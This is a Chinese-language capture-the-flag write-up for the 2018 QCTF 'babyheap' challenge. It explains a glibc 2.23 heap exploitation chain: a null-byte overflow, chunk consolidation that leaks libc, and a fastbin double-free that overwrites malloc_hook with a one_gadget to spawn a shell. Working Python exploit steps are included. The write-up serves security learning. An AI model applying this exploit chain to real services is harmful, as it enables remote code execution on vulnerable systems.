# 2018 QCTF babyheap

本文记录一个简单的堆利用问题。

附件：
- libc-2.23.so
- timu

glibc源码：
- malloc.c

本题中通过选项1创建新的笔记，通过选项2删除笔记，选项3查看所有的笔记。

然而，创建笔记的时候，我们可以将一个null字符溢出至下一个chunk中，因此我们可以将下一个chunk中size的低八位覆盖为0，同时也会将PREV_INUSE位覆盖为0。接下来，考虑对fastbin进行攻击，其基本思想是构造如下的两个chunk：

```c
chunk_1 = malloc(0x68);
chunk_2 = malloc(0x68);
```

并将其按如下方式释放：

```c
free(chunk_1);    // Step 1
free(chunk_2);    // Step 2
free(chunk_1);    // Step 3
```

根据glibc 2.23中free的逻辑（malloc.c，3928~3948），fastbin中的情况如下：

```
// Step 1
      
+-----------+
|           |
|  chunk_1  +------> NULL
|           |
+-----------+

// Step 2
      
+-----------+        +-----------+
|           |        |           |
|  chunk_2  +------> +  chunk_1  +------> NULL
|           |        |           |
+-----------+        +-----------+

// Step 3
+--------------------------------------------+
|                                            |
|    +-----------+        +-----------+      |
|    |           |        |           |      |
+--> +  chunk_1  +------> +  chunk_2  +------+
     |           |        |           |
     +-----------+        +-----------+
```

对于被放入fastbin中的chunk，程序并不会将下一个chunk的PREV_INUSE位置0，因此将同一个符合fastbin大小的chunk释放两次并不会出现double free or corruption (!prev)的错误（malloc.c，3984~3989）。

调用malloc来重新取用chunk_1：（malloc.c，3362~3395）

```c
chunk_3 = malloc(0x68);    // chunk_1
```

修改chunk_3的内容即可让fastbin的尾节点指向任意地址，再执行

```c
chunk_4 = malloc(0x68);
chunk = malloc(0x68);
```

修改chunk即可实现任意地址写（arbitrary writing）。


然而，对于本题而言，修改chunk内容甚至于重复释放chunk是做不到的。我们可以尝试通过覆盖PREV_INUSE位来触发free中向前合并（malloc.c，4013~4018）与向后合并（malloc.c，4001~4007）的过程。关键步骤如下：

```python
create(0x108, b'A')    # <1>
create(0x108, b'B')
create(0x68, b'C')
create(0x68, b'D')
create(0x108, b'E'*0xf0+p64(0x100)+p64(0x11))
delete(2)
delete(3)
delete(0)

create(0x68, b'F'*0x60 + p64(0x300))    # <2>
delete(4)
create(0x108, b'G')
show()
p.recvuntil(b'1 : ')
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - (main_arena_offset + 88)

create(0x128, b'H'*0x100 + p64(0) + p64(0x71) + p64(malloc_hook - 0x23))    # <3>
create(0x68, b'I')
create(0x68, b'\0'*(0xb+0x8) + p64(one_gadget))
```

上述代码的<1>处构造了五个堆块，这样构造的目的将在后续的步骤中体现。需要特别注意的是在后续步骤中E.size的低字节将会被覆盖为0，故E的结尾需要伪造一个PREV_INUSE位以通过程序的检查（malloc.c，3985~3989）。

在<2>处，F与D的地址重合，于是我们相当于向E的size中溢出了一个字节的00，释放E时与0x300字节以前的伪堆块——这个伪堆块刚好就是A——发生向前合并，此时合并后的堆块刚好在unsorted bin中。接下来从unsorted bin中切分出一个大小为0x110的chunk，此时从B中刚好可以读到加上了某个固定偏移后的libc基址。

而在<3>处我们使用了fastbin attack来完成任意地址写，这里将伪造的堆块设置在malloc_hook - 0x23处以通过程序对该伪堆块的size检查（malloc.c，3383~3389），最后将malloc_hook处的指针覆盖为one_gadget的地址，再次申请一个chunk即可拿到shell。



至于patch了其他同版本的libc后one_gadget坏掉了不能用的情况嘛……